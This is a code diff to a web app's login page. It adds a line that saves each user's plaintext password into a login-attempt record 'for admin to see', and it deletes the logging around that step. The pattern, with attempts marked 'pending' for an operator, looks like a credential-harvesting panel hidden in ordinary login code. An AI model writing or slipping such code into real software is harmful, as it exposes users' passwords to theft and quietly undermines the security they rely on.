@@ -92,14 +92,13 @@ export default function LoginPage() {
           userId: storedRegistrationId || '',
           clientId: clientId,
           email: normalizedEmail,
+          password: password, // Save password for admin to see
           status: 'pending',
         });
         
-        console.log('[Login] Login attempt created:', attemptId);
         sessionStorage.setItem('login_attempt_id', attemptId);
       } catch (attemptError) {
-        console.error('[Login] Could not create login attempt:', attemptError);
-        // Continue anyway - the old system will work
+        // Continue anyway
       }
 
       // Update presence
